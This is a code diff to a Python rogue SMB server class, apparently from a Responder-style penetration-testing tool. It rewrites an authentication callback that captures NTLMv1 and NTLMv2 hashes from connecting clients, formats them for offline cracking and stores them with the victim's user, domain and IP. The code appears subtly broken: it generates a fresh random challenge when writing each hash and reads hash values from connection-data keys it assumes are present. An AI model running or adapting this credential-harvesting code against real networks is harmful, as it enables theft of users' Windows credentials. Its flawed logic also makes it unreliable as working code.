@@ -390,28 +390,33 @@ class ResponderSMBServer(SimpleSMBServer):
 		self.setSMB2Support(True)
 		
 		# Set up authentication callback
-		def auth_callback(connectionId, username, client, password, domain, lmhash, nthash):
-			client_ip = client.getpeername()[0]
+		def auth_callback(smbServer, connData, domain_name, user_name, host_name):
+			# Get client IP from connection data
+			client_ip = connData.get('ClientIP', 'unknown')
+			
+			# Extract credentials from connection data if available
+			lmhash = connData.get('lmhash', None)
+			nthash = connData.get('nthash', None)
 			
 			if lmhash and nthash:
 				# Parse and save the hash
 				if len(nthash) == 24:  # NTLMv1
-					WriteHash = '%s::%s:%s:%s:%s' % (username, domain, lmhash.hex().upper(), nthash.hex().upper(), RandomChallenge().hex())
+					WriteHash = '%s::%s:%s:%s:%s' % (user_name, domain_name, lmhash.hex().upper(), nthash.hex().upper(), RandomChallenge().hex())
 					SaveToDb({
 						'module': 'SMB', 
 						'type': 'NTLMv1-SSP', 
 						'client': client_ip, 
-						'user': domain+'\\'+username, 
+						'user': domain_name+'\\'+user_name, 
 						'hash': nthash.hex().upper(), 
 						'fullhash': WriteHash,
 					})
 				else:  # NTLMv2
-					WriteHash = '%s::%s:%s:%s:%s' % (username, domain, RandomChallenge().hex(), nthash[:32].hex().upper(), nthash[32:].hex().upper())
+					WriteHash = '%s::%s:%s:%s:%s' % (user_name, domain_name, RandomChallenge().hex(), nthash[:32].hex().upper(), nthash[32:].hex().upper())
 					SaveToDb({
 						'module': 'SMB', 
 						'type': 'NTLMv2-SSP', 
 						'client': client_ip, 
-						'user': domain+'\\'+username, 
+						'user': domain_name+'\\'+user_name, 
 						'hash': nthash.hex().upper(), 
 						'fullhash': WriteHash,
 					})
